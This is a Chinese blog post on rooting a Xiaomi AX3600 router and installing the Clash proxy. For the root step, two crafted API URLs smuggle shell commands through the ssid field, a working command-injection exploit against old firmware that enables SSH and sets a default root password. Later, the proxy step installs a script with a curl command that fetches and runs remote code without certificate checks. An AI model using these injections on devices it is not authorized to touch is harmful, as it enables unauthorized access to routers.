---
title: AX3600开启ssh并使用Clash实现透明代理
date: 2020-09-13 12:29:28
tags:
  - OpenWRT
  - GFW
  - Shadowsocks
  - ShadowsocksR
  - V2Ray
  - Trojan
  - Proxy
  - Clash
  - Xiaomi
  - Router
  - ROM
categories: 笔记
---

整了台小米路由器 AX3600 玩 ~~我没有 root 权限会死所以~~root 了下，发现还能用 clash

<!-- more -->

## 获取 root 权限并打开 ssh

### 使用官方固件漏洞开启 ssh

先需要将固件版本降级到`1.0.17`，固件可以在[这里](https://drive.google.com/drive/folders/1tIjKMNSSrkYm8vBGmk-gPTjTrYuREGLt)下载。

连接上 wifi 并打开[路由器管理页面](http://192.168.31.1/)

登录后浏览器地址栏应该是这样的：

```url
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/web/home#router
```

复制记下这个`<STOK>`

把下面 URL 中的`<STOK>`替换成刚才的，并访问

```url
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B
```

会显示`{"code":0}`

再来一个 URL，注意替换`STOK`

```url
http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20'admin%5Cnadmin'%20%7C%20passwd%20root%3B
```

到这里 ssh 就成功打开了
可以使用用户名 root+密码 admin 来 ssh 登录路由器

```bash
ssh root@192.168.31.1
```

输入密码回车后可以看到

```text
BusyBox v1.25.1 (YYYY-MM-DD HH:mm:ss UTC) built-in shell (ash)

 -----------------------------------------------------
       Welcome to XiaoQiang!
 -----------------------------------------------------
  $$$$$$\  $$$$$$$\  $$$$$$$$\      $$\      $$\        $$$$$$\  $$\   $$\
 $$  __$$\ $$  __$$\ $$  _____|     $$ |     $$ |      $$  __$$\ $$ | $$  |
 $$ /  $$ |$$ |  $$ |$$ |           $$ |     $$ |      $$ /  $$ |$$ |$$  /
 $$$$$$$$ |$$$$$$$  |$$$$$\         $$ |     $$ |      $$ |  $$ |$$$$$  /
 $$  __$$ |$$  __$$< $$  __|        $$ |     $$ |      $$ |  $$ |$$  $$<
 $$ |  $$ |$$ |  $$ |$$ |           $$ |     $$ |      $$ |  $$ |$$ |\$$\
 $$ |  $$ |$$ |  $$ |$$$$$$$$\       $$$$$$$$$  |       $$$$$$  |$$ | \$$\
 \__|  \__|\__|  \__|\________|      \_________/        \______/ \__|  \__|


root@XiaoQiang:~#
```

这个 RUOK 就很灵性

### 更改密码及权限维持

重新设置 root 密码

```bash
passwd root
#在路由器shell执行
```

这样并不能保证升级后 ssh 仍能使用，如果留在这个版本漏洞还是有一定风险。

备份

```bash
nanddump -f /tmp/bdata_mtd9.img /dev/mtd9
#在路由器shell执行
```

用你喜欢的方式下载`bdata_mtd9.img`，我使用 scp 命令

```bash
scp root@192.168.31.1:/tmp/bdata_mtd9.img ~/
```

下载[`fuckax3600`](fuckax3600)(作者：[paldier](https://www.right.com.cn/forum/space-uid-194813.html)) 并传到路由器的`/tmp`目录

```bash
scp ~/Downloads/fuckax3600 root@192.168.31.1:/tmp/
```

```bash
chmod +x /tmp/fuckax3600
/tmp/fuckax3600 unlock
#在路由器shell执行
```

等待路由器重启后

```bash
/tmp/fuckax3600 hack
#在路由器shell执行
```

会自动设置永久 ssh、telnet、uart 权限，同时会计算出默认的 root 密码，注意记录密码，恢复出厂后 telnet 和 ssh 需要用

```bash
/tmp/fuckax3600 lock
#在路由器shell执行
```

然后就可以升级新版本了，如果升级完新版本 ssh 不能用

使用 telnet 登录

```bash
telnet 192.168.31.1
```

```bash
sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear
/etc/init.d/dropbear start
#在路由器shell执行
```

## 安装 clash 作为透明代理

这里使用一键脚本[`ShellClash`](https://github.com/juewuy/ShellClash)

```bash
sh -c "$(curl -kfsSl https://cdn.jsdelivr.net/gh/juewuy/ShellClash@latest/install.sh)" && source /etc/profile &> /dev/null
clash
#在路由器shell执行
```

使用`clash`命令就能打开管理脚本

## 参考

- [[AX3600] 小米 ax3600 获取 root 权限【简单快速】【修复丢 ssid】](https://www.right.com.cn/forum/forum.php?mod=viewthread&tid=4046020)

- [juewuy/ShellClash](https://github.com/juewuy/ShellClash)

- [Clash for Miwifi 安装及使用教程](https://juewuy.github.io/post/clash-for-miwifi-an-zhuang-ji-shi-yong-jiao-cheng/)
